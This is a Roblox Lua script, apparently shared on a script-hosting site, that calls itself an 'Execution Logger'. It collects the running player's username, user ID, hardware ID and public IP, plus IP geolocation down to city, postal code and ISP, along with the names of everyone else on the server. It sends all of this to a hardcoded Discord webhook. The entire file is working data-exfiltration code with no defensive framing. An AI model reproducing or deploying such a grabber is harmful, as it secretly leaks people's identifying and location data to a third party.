--[[
WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

-- Определяем тип сервера (приватный или публичный)
local function isPrivateServer()
    return game.PrivateServerId ~= "" and game.PrivateServerId ~= "0"
end

-- Получаем список игроков на сервере с их DisplayName и Username
local function getPlayerList()
    local playerList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        local profileLink = string.format("https://www.roblox.com/users/%d", player.UserId)
        table.insert(playerList, string.format("Псевдоним: %s   |   Ник: %s\nПрофиль: [%s](%s)", player.DisplayName, player.Name, player.Name, profileLink))
    end
    return table.concat(playerList, "\n\n")
end

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    -- Проверяем тип сервера и составляем сообщение
    local serverTypeMessage = isPrivateServer() and "Приватный" or "Публичный"

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "👤 Player Information",
                description = string.format(
                    "**Псевдоним:** %s\n**Ник:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms\n**Server Type:** %s",
                    DisplayName, Username, UserId, MembershipType, AccountAge, Platform, Ping,
                    serverTypeMessage
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "👥 Players on Server",
                description = getPlayerList(),
                color = tonumber("0x3498db"),
            },
            {
                title = "⚙️ Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer =
                {
                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1288789321192570972/nmuQYBwSVNjtZVp0afW2DACovpQ59kphCs0bWMi4bR9Wea4UavtbFjhxeuK8OLoQSqnI"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
